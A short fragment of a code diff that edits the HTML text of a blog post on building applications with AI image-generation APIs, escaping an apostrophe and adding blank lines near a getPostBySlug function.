         <li><strong>E-commerce:</strong> Create lifestyle mockups for products.</li>
       </ul>
-      <p>By mastering the APIs and understanding the key parameters, you can move from being a user of AI tools to a creator of AI-powered applications. Start experimenting with a simple script, and you'll quickly discover the immense creative potential at your fingertips.</p>
+      <p>By mastering the APIs and understanding the key parameters, you can move from being a user of AI tools to a creator of AI-powered applications. Start experimenting with a simple script, and you\'ll quickly discover the immense creative potential at your fingertips.</p>
       <div class="italic text-center text-muted-foreground pt-4 border-t mt-8">
         From prompt to pixel, a thought takes form,<br/>
         In latent space, a creative storm.
@@ -6558,6 +6558,8 @@ export function getPostBySlug(slug: string) {
     
 
     
+
+
 
 
 
